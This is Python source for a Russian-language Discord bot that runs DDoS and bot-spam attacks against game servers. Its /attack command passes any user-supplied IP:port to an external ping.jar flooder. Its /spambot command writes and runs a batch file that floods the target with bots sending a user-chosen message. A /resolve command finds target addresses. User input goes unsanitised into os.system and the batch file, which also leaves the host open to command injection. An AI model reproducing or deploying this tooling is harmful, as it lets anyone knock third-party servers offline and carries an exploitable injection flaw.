import discord
import os
import threading
import requests
import asyncio
import config
from discord.commands import Option
import pathlib
import subprocess

from discord.ext import commands

bot = discord.Bot()
botname = config.BOT
discordlink = config.DISCORD
testingservers = config.GUILDS


def attack_server(ip):
    os.system("java -jar ping.jar {}".format(ip))

def attack_server_spambot(ip, message):
    ip1, port = ip.split(':', 1)
    batch = f'@echo off\nstart \"attack\" java -Dip={ip1}:{port} -Xmx1800M -Dmsg=\"{message}\" -jar b.jar\ntimeout /t 80\ntaskkill /im java.exe'
    batch_f = pathlib.Path('./attack.bat')
    if batch_f.exists():
        os.remove('./attack.bat')
    with open("./attack.bat", "a+") as f:
        f.write(batch)
        f.close()
    subprocess.call([r'attack.bat'])

@bot.event
async def on_ready():
    print("Bot started: {0.user}".format(bot))
    while True:
        await bot.change_presence(activity=discord.Game(name=discordlink))
        await asyncio.sleep(10.0)
        await bot.change_presence(activity=discord.Game(name="/attack - атака!"))
        await asyncio.sleep(10.0)
        await bot.change_presence(activity=discord.Game(name="/credits - инфа!"))

@bot.event
async def on_application_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        error = discord.Embed(
            title="Ошибка",
            description=f"Эта команда на задержке. Ты сможешь её использовать через {round(error.retry_after, 2)} секунд.",
            color = discord.Colour.red()
        )
        await ctx.respond(embed=error)
    else:
        raise error


@bot.slash_command(guild_ids = testingservers, name = "credits", description = "Информация о создателе!")
@commands.cooldown(1, 60, commands.BucketType.user)
async def credits(ctx):
    embed = discord.Embed(
        title='Информация о создателе!',
        description=f'Надо проинформаровать {ctx.author.mention}!',
        color=discord.Colour.red()
    )
    embed.add_field(name='➦ Создатель', value ='<@731428949665513572>', inline=False)
    embed.add_field(name='➦ Кодер', value ='<@967316503651315782>', inline=False)
    embed.add_field(name='➦ Создание', value ='Создна на Python, с кофейком и с любовью<3', inline=False)
    embed.set_image(url='https://i.gifer.com/origin/e9/e9329b236da049a682773a98868ba2c1.gif')
    await ctx.respond(embed=embed)

@bot.slash_command(guild_ids = testingservers, name = "reload", description = "Перезагрузка!")
@commands.has_permissions(administrator=True)
async def reload(ctx):
    try:
        await ctx.respond(f'Бот перезапущен!\n\n Ждёт работоспособности! ')
        os.system(f'python bot.py')
    except:
        await ctx.respond("Бот умер, перезапустите пожалуйта!")

@bot.slash_command(guild_ids = testingservers, name = "clear", description = "Очистить сообщения!")
@commands.has_permissions(manage_messages=True)
async def clear(ctx, limit: Option(int, "Сколько сообщений удалить")):
        await ctx.channel.purge(limit=int(limit))
        embed1 = discord.Embed(title = "Очистка...", description=f"Канал бы очищен от {limit} сообщений. Вызвал команду: {ctx.author.mention}",color = discord.Color.from_rgb(255,0,0  ))
        await ctx.respond(embed=embed1, delete_after=10)

@bot.slash_command(guild_ids = testingservers, name = "attack", description = "Атака сервера!")
@commands.cooldown(1, 60, commands.BucketType.user)
async def attack(ctx, ip: Option(str, "Айпи сервера для атаки")):
    def attack_start():
       thread = threading.Thread(target=attack_server, args=(ip,))
       thread.setDaemon(True)
       thread.start()
    if ":" in ip:
        pass
    else:
        error = discord.Embed(
            title="Ошибка",
            description="Не указан порт сервера",
            color = discord.Colour.red()
        )
        return await ctx.respond(embed=error)
    embed = discord.Embed(
        title='Начало атаки...',
        description=f'Атака от {ctx.author.mention}',
        color=discord.Colour.red()
    )
    embed.add_field(name='Айпи сервера:', value="{}".format(ip), inline=False)
    embed.set_image(url=config.ATTACK_GIF)
    embed.set_footer(text="DDoS by " + botname)
    attack_start()
    await ctx.respond(embed=embed)

@bot.slash_command(guild_ids = testingservers, name = "spambot", description = "Атака спам ботами (Могут быть баги)")
@commands.cooldown(1, 60, commands.BucketType.user)
async def spambot(ctx, ip: Option(str, "Айпи сервера для атаки"), message: Option(str, "Сообщение которое будут отправлять боты (можно указать команду)")):
    def attack_start():
       thread = threading.Thread(target=attack_server_spambot, args=(ip,message,))
       thread.setDaemon(True)
       thread.start()
    if ":" in ip:
        pass
    else:
        error = discord.Embed(
            title="Ошибка",
            description="Не указан порт сервера",
            color = discord.Colour.red()
        )
        return await ctx.respond(embed=error)
    embed = discord.Embed(
        title="Начало атаки спамом...",
        description=f'Атака от {ctx.author.mention}',
        color = discord.Colour.red()
    )
    embed.add_field(name='Айпи сервера:', value="{}".format(ip), inline=True)
    embed.add_field(name='Сообщение:', value="{}".format(message), inline=True)
    embed.set_image(url=config.ATTACK_GIF)
    embed.set_footer(text="DDoS by " + botname)
    attack_start()
    await ctx.respond(embed=embed)

@bot.slash_command(guild_ids = testingservers, name = "resolve", description = "Узнать айпи сервера!")
@commands.cooldown(1, 60, commands.BucketType.user)
async def resolve(ctx, server: Option(str, "Айпи сервера (например hypixel.net)")):
    url = "https://api.mcsrvstat.us/2/" + server
    resp = requests.get(url)
    data = resp.json()

    embed = discord.Embed(
        title="Решено!",
        color=discord.Colour.red()
    )

    ip = data["ip"]
    port = data["port"]
    version = data["version"]
    players = data["players"]['online']
    hostname = data["hostname"]
    online = str(data["online"]).replace("True", "Сервер включён").replace("False", "Сервер выключен")

    embed.add_field(name='Айпи', value=ip, inline=True)
    embed.add_field(name='Порт', value=port, inline=True)
    embed.add_field(name="Имя хоста", value=hostname, inline=True)
    embed.add_field(name="Версия", value=version, inline=True)
    embed.add_field(name="Игроков", value=players, inline=True)
    embed.add_field(name="Статус", value=online, inline=True)
    
    embed.set_image(url=f'http://status.mclive.eu/{botname}/{ip}/{port}/banner.png')
    embed.set_footer(text=botname)
    await ctx.respond(embed=embed)

bot.run(config.TOKEN)
